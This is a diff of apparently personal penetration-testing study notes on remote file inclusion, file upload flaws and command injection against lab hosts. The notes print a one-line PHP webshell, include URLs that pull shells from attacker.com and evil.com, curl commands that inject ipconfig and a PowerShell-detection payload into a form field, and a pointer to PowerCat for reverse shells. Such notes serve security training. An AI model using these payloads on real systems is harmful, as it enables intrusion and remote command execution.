@@ -300,9 +300,9 @@
      - **Remote file inclusion (RFI)** : include files from a remote system over HTTP or SMB. E.g http://target.com/index.php?page=http://attacker.com/shell.txt
        - Requires allow_url_include=On in PHP config  
        - PHP webshell locates in kali "/usr/share/webshells/php/"  
-       - remote file must access by target system. Use Python3 http.server to start a web server `/usr/share/webshells/php/$ python3 -m http.server 80` or GitHub accessible file
+       - remote file must access by target system. Use Python3 http.server to start a web server    
+         `/usr/share/webshells/php/$ python3 -m http.server 80` or GitHub accessible file  
        - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`: Exploiting RFI with a PHP backdoor and execution of ls
-       - shell.txt `<?php system($_GET['cmd']); ?>` then run `http://target.com/index.php?page=http://evil.com/shell.txt&cmd=id`
      - **File upload vulnerabilities**
        - scenarios: directory traversal + overwrite authorized_keys; file upload XXE or XSS; macros in docx.  
        - file upload + code execution to obtain reverse shell  
@@ -333,7 +333,7 @@
      - bad commands detected (ipconfig), try git
      - `curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive` : %3B is semi colon, windows use 1 ampersand  
      - identify the commands are executed by PowerShell or CMD  
-     - `(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`: Code Snippet to check where our code is executed  
+     - (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell: Code Snippet to check where our code is executed  
      - `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`: URL encoding. Output shows PowerShell  
       
      - `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`use PowerCat to create a reverse shell  
